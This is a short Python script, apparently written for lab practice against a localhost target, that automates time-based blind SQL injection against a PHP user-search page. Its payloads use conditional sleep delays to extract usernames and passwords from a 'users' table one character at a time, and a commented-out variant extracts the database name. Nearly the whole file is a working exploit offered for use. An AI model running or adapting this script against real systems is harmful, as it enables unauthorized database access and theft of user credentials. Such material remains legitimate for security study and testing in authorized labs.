#!/usr/bin/python3
import requests
from pwn import *
import signal
import sys
import time

# manage force stop
def def_handler(sig, frame):
    print('\n[!] Exiting...\n')
    sys.exit(1)

def makeSQLI():
    # show progess
    progress_bar_1 = log.progress('BRUTE FORCE')
    progress_bar_1.status('Starting brute force')
    time.sleep(2)
    progress_bar_2 = log.progress('Extracted data')

    # extracted data
    matchedString = ''
    for word_position in range(1, 100):
        for character in range(33, 127):
            # construct url injection
            # retrieve database name
            #sqli_url = main_url + '?' + 'id=1 and if(ascii(substring(database(),%d,1))=%d,sleep(0.35),0)' % (word_position, character)
            # retrieve username and password by using group_concat()
            sqli_url = main_url + '?' + 'id=1 and if(ascii(substring((select group_concat(username, 0x3a, password) from users),%d,1))=%d,sleep(0.35),0)' % (word_position, character)

            progress_bar_1.status(sqli_url)

            # capture query time
            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()

            # verifying status code
            if time_end - time_start >= 0.35:
                matchedString += chr(character)
                progress_bar_2.status(matchedString)
                break

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# global variables
main_url = "http://localhost/searchUsers2.php"
characters = string.printable

if __name__ == '__main__':
    makeSQLI()

